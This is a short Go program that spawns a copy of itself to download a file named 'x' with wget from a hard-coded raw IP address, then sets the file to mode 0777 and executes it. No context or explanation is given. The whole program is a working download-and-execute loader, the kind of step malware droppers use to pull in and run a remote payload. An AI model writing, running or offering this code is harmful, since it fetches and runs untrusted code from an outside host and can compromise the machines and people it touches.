package main

import (
	"fmt"
	"os"
	"os/exec"
)

func main() {
	if len(os.Args) > 1 && os.Args[1] == "child" {
		childProcess()
		return
	}
	parentProcess()
}

func parentProcess() {
	fmt.Println("Parent process starting...")

	//start child process
	cmd := exec.Command(os.Args[0], "child")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	err := cmd.Start()
	if err != nil {
		fmt.Printf("Parent: failed to start child process: %v", err)
	}

	fmt.Printf("Parent: started child with PID: %v\n", cmd.Process.Pid)

	//wait for child process to complete
	err = cmd.Wait()
	if err != nil {
		fmt.Printf("Parent: child process error: %v\n", err)
	} else {
		fmt.Println("Parent: Child process completed")
	}

	// check if the x file exists
	if _, err := os.Stat("x"); os.IsNotExist(err) {
		fmt.Println("Parent: ERROR - file 'x' does not exist!")
		return
	} else {
		fmt.Println("Parent: file 'x' exists")
	}

	info, _ := os.Stat("x")
	fmt.Printf("Parent: current permissions: %v\n", info.Mode())

	//chmod 777
	fmt.Println("Parent: attempting chmod...")
	err = os.Chmod("x", 0777)
	if err != nil {
		fmt.Printf("Parent: chmod failed: %v\n", err)
		return
	}

	fmt.Println("Parent: chmod successful")

	//execute the file
	fmt.Println("Parent: attempting to execute 'x'...")
	cmd = exec.Command("./x")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	err = cmd.Run()
	if err != nil {
		fmt.Printf("Parent: execution failed: %v\n", err)
	} else {
		fmt.Println("Parent: execution completed successfully")
	}
}

func childProcess() {
	fmt.Println("Child: starting wget download...")

	cmd := exec.Command("wget", "http://18.178.192.170/x")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	err := cmd.Run()
	if err != nil {
		fmt.Printf("Child: wget failed: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("Child: wget completed successfully")
	os.Exit(0)
}
